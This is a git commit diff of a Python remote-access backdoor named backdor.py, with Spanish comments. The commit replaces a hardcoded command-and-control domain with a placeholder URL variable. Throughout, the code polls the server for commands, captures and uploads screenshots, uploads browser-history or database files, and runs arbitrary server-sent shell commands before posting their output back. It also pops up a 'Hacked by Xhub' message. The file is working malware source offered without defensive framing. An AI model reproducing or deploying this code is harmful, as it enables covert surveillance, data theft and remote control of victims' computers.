655673b4f4babcac2434446384f9ad4afffcaeed
piter <68443246+PiterIvano@users.noreply.github.com>
2021-11-15 07:25:46 +0100

    Update backdor.py

--- backdor.py
+++ backdor.py
@@ -23,34 +23,35 @@ os.system(di)
 
 
 user = getpass.getuser()
-
+#aqui ira el nombre de su dominio
+urlp = "-----------------------"
 
 select = {'user': user}
 
 headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
-ip = requests.post("http://panamasocail.com/exe/back/ip.php", headers=headers, data=select).text
+ip = requests.post(f"{urlp}/exe/back/ip.php", headers=headers, data=select).text
 #print("Iniciando")
 #print("IP: " + ip)
 time.sleep(2)
 while True:
     dat = "cls"
     time.sleep(1)
-    enter = requests.post("http://panamasocail.com/exe/back/comand.txt", headers=headers)
+    enter = requests.post(f"{urlp}/exe/back/comand.txt", headers=headers)
     #esta parte es la parte individual, esto genera que solo un usuario lo haga
     if enter.text == "":
-        enter = requests.post(f"http://panamasocail.com/exe/back/{ip}.txt", headers=headers)
+        enter = requests.post(f"{urlp}/exe/back/{ip}.txt", headers=headers)
         rec = enter.text
         print(rec)
         if rec == "hacked":
             MessageBox.showinfo("Hacked by Xhub", "Has sido Hackeado\nNo descargar cualquier cosa!")
-            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
         elif rec == "":
             print("No hay comandos")
             time.sleep(60)
         elif rec == "photo":
             captura = pyautogui.screenshot()
             num = random.randint(10,30)
-            url = "http://panamasocail.com/exe/photo/photo.php"
+            url = f"{urlp}/exe/photo/photo.php"
             noma = f"/Users/CellMax/Documents/pantalla{num}.png"
             captura.save(noma)
             headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
@@ -58,7 +59,7 @@ while True:
             send = requests.post(url, files=files, headers=headers)
             envio = send.text
             print(envio)
-            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
 
         elif rec == "database":
             getuser = getpass.getuser()
@@ -79,7 +80,7 @@ while True:
             file.close()
 #url que se usara para recivir los archivos
 
-            url = "https://panamasocail.com/exe/dbs/cxxxxxxxxxxx.php"
+            url = f"{urlp}/exe/dbs/cxxxxxxxxxxx.php"
             #headers 
             headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
 
@@ -108,16 +109,16 @@ while True:
             files = {"subir_archivo": open(history, "rb")}
             send = requests.post(url, files=files, headers=headers)
             envio = send.text
-            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
 
         else:
             env = subprocess.check_output(rec, shell=True)
             time.sleep(1)
             envio = str(env)
-            envi = requests.post("http://panamasocail.com/exe/back/comand.php", data={"data": envio}, headers=headers)
+            envi = requests.post(f"{urlp}/exe/back/comand.php", data={"data": envio}, headers=headers)
             time.sleep(5)
             print(envi.text)
-            e = requests.post(f"http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
 
             time.sleep(5)
 #Aqui termina la parte de usuario individual, y comienza la parte de todos los usuarios
@@ -126,14 +127,14 @@ while True:
         print(rec)
         if rec == "hacked":
             MessageBox.showinfo("Hacked by Xhub", "Has sido Hackeado\nNo descargar cualquier cosa!")
-            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"data": "listo"}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"data": "listo"}, headers=headers)
         elif rec == "":
             print("No hay comandos")
             time.sleep(60)
         elif rec == "photo":
             captura = pyautogui.screenshot()
             num = random.randint(10,30)
-            url = "http://panamasocail.com/exe/photo/photo.php"
+            url = f"{urlp}/exe/photo/photo.php"
             noma = f"/Users/CellMax/Documents/pantalla{num}.png"
             captura.save(noma)
             headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
@@ -141,7 +142,7 @@ while True:
             send = requests.post(url, files=files, headers=headers)
             envio = send.text
             print(envio)
-            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
             
         elif rec == "database":
             getuser = getpass.getuser()
@@ -163,7 +164,7 @@ while True:
 
             """URL A USAR"""
 
-            url = "https://panamasocail.com/exe/dbs/cxxxxxxxxxxx.php"
+            url = f"{urlp}/exe/dbs/cxxxxxxxxxxx.php"
             """Aqui el headers"""
             headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
 
@@ -194,13 +195,13 @@ while True:
             files = {"subir_archivo": open(history, "rb")}
             send = requests.post(url, files=files, headers=headers)
             envio = send.text
-            e = requests.post("http://panamasocail.com/exe/back/comand.php", data={"data": "listo"}, headers=headers)
+            e = requests.post(f"{urlp}/exe/back/comand.php", data={"data": "listo"}, headers=headers)
 
         else:
             env = subprocess.check_output(rec, shell=True)
             time.sleep(1)
             envio = str(env)
-            envi = requests.post("http://panamasocail.com/exe/back/comand.php", data={"data": envio}, headers=headers)
+            envi = requests.post(f"{urlp}/exe/back/comand.php", data={"data": envio}, headers=headers)
             time.sleep(5)
             print(envi.text)
             time.sleep(20)
